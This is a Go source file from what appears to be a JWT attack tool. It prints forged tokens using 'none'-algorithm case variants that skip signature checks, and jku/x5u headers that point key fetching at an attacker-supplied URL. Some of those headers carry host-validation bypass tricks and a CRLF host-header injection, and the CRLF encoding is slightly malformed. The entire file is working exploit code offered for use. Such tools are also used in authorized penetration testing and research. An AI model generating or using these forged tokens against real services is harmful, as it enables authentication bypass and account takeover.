package paylaod

import (
	b64 "encoding/base64"
	"fmt"
	"os"
	"strings"

	"github.com/golang-jwt/jwt/v5"
	"github.com/sirupsen/logrus"
)

var log = logrus.New()

// GenerateAllPayloads is printing all payloads
func GenerateAllPayloads(token *jwt.Token, turl, aurl, protocol string) {
	log.Out = os.Stdout
	GenerateNonePayloads(token.Raw)
	GenerateUrlPayloads(token.Raw, turl, aurl, protocol)
}

// GenerateNonePayloads is printing none payloads
func GenerateNonePayloads(token string) {
	tokens := strings.Split(token, ".")
	claims := tokens[1]
	var pattern = []string{
		"none",
		"NonE",
		"NONE",
	}

	for k, v := range pattern {
		_ = k
		header := "{\"alg\":\"" + v + "\",\"typ\":\"JWT\"}"
		baseHeader := b64.StdEncoding.EncodeToString([]byte(header))
		log.WithFields(logrus.Fields{
			"payload": v,
			"header":  header,
		}).Info("Generate " + v + " payload")
		fmt.Println(baseHeader + "." + claims + ".\n")
	}

}

// GenerateUrlPayloads is printing jku / x5u paylaod
func GenerateUrlPayloads(token, turl, aurl, protocol string) {
	tokens := strings.Split(token, ".")
	claims := tokens[1]
	var pattern = []string{
		"jku",
		"x5u",
	}

	for _, v := range pattern {
		// basic
		header := "{\"alg\":\"hs256\",\"" + v + "\":\"" + aurl + "\",\"typ\":\"JWT\"}"
		baseHeader := b64.StdEncoding.EncodeToString([]byte(header))
		log.WithFields(logrus.Fields{
			"payload": v,
			"header":  header,
		}).Info("Generate " + v + " + basic payload")
		fmt.Println(baseHeader + "." + claims + ".\n")

		// bypass host validation
		header = "{\"alg\":\"hs256\",\"" + v + "\":\"" + protocol + "://" + turl + "Z" + aurl + "\",\"typ\":\"JWT\"}"
		baseHeader = b64.StdEncoding.EncodeToString([]byte(header))
		log.WithFields(logrus.Fields{
			"payload": v,
			"header":  header,
		}).Info("Generate " + v + " host validation payload")
		fmt.Println(baseHeader + "." + claims + ".\n")

		header = "{\"alg\":\"hs256\",\"" + v + "\":\"" + protocol + "://" + turl + "@" + aurl + "\",\"typ\":\"JWT\"}"
		baseHeader = b64.StdEncoding.EncodeToString([]byte(header))
		log.WithFields(logrus.Fields{
			"payload": v,
			"header":  header,
		}).Info("Generate " + v + " host validation payload")
		fmt.Println(baseHeader + "." + claims + ".\n")

		// Host header Injection with CRLF
		header = "{\"alg\":\"hs256\",\"" + v + "\":\"" + protocol + "://" + turl + "%0d0aHost: " + aurl + "\",\"typ\":\"JWT\"}"
		baseHeader = b64.StdEncoding.EncodeToString([]byte(header))
		log.WithFields(logrus.Fields{
			"payload": v,
			"header":  header,
		}).Info("Generate " + v + " host header injection (w/CRLF) payload")
		fmt.Println(baseHeader + "." + claims + ".\n")
	}

}
